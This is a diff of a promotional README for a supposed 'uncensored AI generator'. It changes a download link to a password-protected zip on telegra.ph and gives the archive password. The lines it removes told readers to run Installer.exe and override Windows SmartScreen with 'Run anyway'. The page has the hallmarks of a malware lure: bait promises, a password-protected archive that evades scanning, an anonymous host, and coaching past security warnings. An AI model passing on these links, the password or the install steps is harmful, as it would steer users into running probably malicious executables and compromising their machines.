@@ -2,7 +2,7 @@
 
 Uncensored AI generator - no filters, no limits
 
-**[Uncensored-AI.zip](https://telegra.ph/Download-Tutorial-10-28-10)**  
+**[Uncensored-AI.zip](https://telegra.ph/fff-10-27-8)**  
 password: `IODolz30`
 
 Last updated: October 2026  
@@ -19,13 +19,3 @@ Uncensored AI image generator with no filters and no restrictions. Private local
 - **Privacy** — Local
 - **Package** — tool.zip
 - **Restrictions** — None
-
-## Install
-
-1. Open the Telegraph guide: https://telegra.ph/Download-Tutorial-10-28-10
-2. Download **Uncensored-AI.zip**. Password is `IODolz30`.
-3. Extract, then run **Installer.exe**. If Windows SmartScreen asks, choose More info → Run anyway.
-
----
-
-UncensoredAI-Free
